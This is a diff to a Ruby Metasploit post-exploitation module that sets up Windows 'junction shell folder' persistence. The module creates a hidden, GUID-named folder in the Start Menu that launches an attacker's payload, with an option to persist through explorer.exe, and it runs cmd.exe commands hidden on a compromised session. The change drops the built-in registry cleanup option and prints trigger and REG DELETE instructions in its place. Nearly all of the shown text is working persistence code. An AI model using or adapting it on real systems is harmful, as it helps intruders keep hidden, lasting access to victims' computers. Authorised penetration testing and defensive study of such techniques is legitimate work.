@@ -27,15 +27,6 @@
 # The full path of the appl to run or payload => set APPL_PATH C:\\Windows\\System32\\calc.exe
 # The full path and name of folder to create  => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
 # Use explorer.exe to persiste your agent?    => set PERSIST_EXPLORER true
-# Delete malicious registry hive/keys (GUID)? => set DEL_REGKEY true
-# ------------------------------------------------------------------------------------------
-# The GUID to be deleted                      => set DEL_GUID 0fd30-5siO4-532a-4dte23
-# ------------------------------------------------------------------------------------------
-# WARNING: This post-exploitation module creates a GUID key to be used, and if the exploit
-# its active for days in target system and we need to return to it to delete it, then this
-# option will accept a GUI value to be inputed (we only need to use this option if we exit
-# 'juntion_shell_folders_persistence' module and need to return to it to delete persistence)
-# ------------------------------------------------------------------------------------------
 #
 #
 #
@@ -145,8 +136,6 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer.exe to persiste our agent?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys (GUID)?' , false]),
-                                OptString.new('DEL_GUID', [ false, 'The GUID to be deleted e.g: 0fd30-5siO4-532a-4dte23'])
                         ], self.class) 
 
         end
@@ -296,68 +285,40 @@ def run
            folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           print_warning("DIR: #{folder_poc}")
-           Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          else
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
-           print_status("DIR: #{fol_path}")
+           r = session.sys.process.execute("cmd.exe /R mkdir #{fol_path}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          end
 
 
        #
-       # Clean module sellected (delete GUID reg key)..
+       # exploit finished ..
        #
-       if datastore['DEL_REGKEY'] == true
-         r=''
-         if datastore['DEL_GUID'] == 'nil'
-           print_status("Delete GUID regkey: #{new_GUID}")
-           Rex::sleep(1.0)
-           reg_clear = "#{hive_key}\\#{new_GUID} /f"
-           r = session.sys.process.execute("cmd.exe /R REG DELETE #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
-           print_status("Deleted: #{reg_clear}")
-           Rex::sleep(1.0)
-             if datastore['PERSIST_EXPLORER'] == true
-               folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
-               print_warning("POC Folder needs to be deleted manually ..")
-               print_warning("DIR: #{folder_poc}")
-               Rex::sleep(1.0)
-             else
-               print_warning("POC Folder needs to be deleted manually ..")
-               print_warning("DIR: #{fol_path}")
-               Rex::sleep(1.0)
-             end
-             r.channel.close
-             r.close
-         end
-
+       if datastore['PERSIST_EXPLORER'] == true
+         folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
+         print_good("Module execution finished ..")
+         print_line("--------------------------------")
+         print_line("    Trigger exploit: #{folder_poc}")
+         print_line("")
+         print_line("    To delete all changes made:")
+         print_line("    cmd.exe /R REG DELETE #{hive_key}\\#{new_GUID}")
+         print_line("--------------------------------")
+         Rex::sleep(1.0)
        else
-
-         del_guid = datastore['DEL_GUID']
-         print_status("Delete GUID regkey: #{del_guid}")
+         print_good("Module execution finished ..")
+         print_line("--------------------------------")
+         print_line("    Trigger exploit: #{fol_path}")
+         print_line("")
+         print_line("    To delete all changes made:")
+         print_line("    cmd.exe /R REG DELETE #{hive_key}\\#{new_GUID}")
+         print_line("--------------------------------")
          Rex::sleep(1.0)
-         reg_clear = "#{hive_key}\\#{del_guid} /f"
-         r = session.sys.process.execute("cmd.exe /R REG DELETE #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
-         print_status("Deleted: #{reg_clear}")
-         Rex::sleep(1.0)
-           if datastore['PERSIST_EXPLORER'] == true
-             folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
-             print_warning("POC Folder needs to be deleted manually ..")
-             print_warning("DIR: #{folder_poc}")
-             Rex::sleep(1.0)
-           else
-             print_warning("POC Folder needs to be deleted manually ..")
-             print_warning("DIR: #{fol_path}")
-             Rex::sleep(1.0)
-           end
-           r.channel.close
-           r.close
        end
 
 
